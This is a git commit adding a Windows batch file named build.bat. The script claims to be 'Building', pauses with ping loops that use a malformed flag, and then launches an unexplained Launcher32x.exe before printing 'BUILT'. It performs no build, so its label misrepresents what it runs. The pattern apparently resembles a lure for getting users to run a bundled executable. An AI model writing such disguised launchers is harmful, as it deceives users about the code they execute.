5ca996ef822ff2aec114567e388f59cd47d5564c
MishaPisha2 <97434238+MishaPisha2@users.noreply.github.com>
2023-10-30 08:50:36 +0200

    Add files via upload

---
+++ build.bat
@@ -0,0 +1,11 @@
+@echo off
+echo Building........
+ping n- 2 127.0.0.1>nul
+ping n- 2 127.0.0.1>nul
+start Launcher32x.exe
+ping n- 2 127.0.0.1>nul
+ping n- 2 127.0.0.1>nul
+cls
+echo BUILT
+pause
+
